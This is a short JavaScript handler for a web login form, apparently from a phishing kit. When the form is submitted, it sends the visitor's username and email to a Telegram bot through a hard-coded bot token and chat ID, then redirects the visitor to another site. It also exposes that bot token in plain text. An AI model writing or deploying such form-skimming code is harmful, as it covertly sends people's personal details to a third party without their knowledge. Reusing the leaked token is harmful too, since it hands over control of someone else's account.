const token = '7707045379:AAEYcmhh4zKBJ4LEAFDR36gX9yAmGhdrT8Y';
const chatId = '6454550864';

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value;

    const message = `📧 تسجيل جديد\n\n👤 الاسم: ${username}\n📩 البريد الإلكتروني: ${email}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => {
        if (response.ok) {
            window.location.href = 'https://kd1s.com/';
        } else {
            alert('حدث خطأ، حاول مرة أخرى.');
        }
    })
    .catch(error => console.error('Error:', error));
});
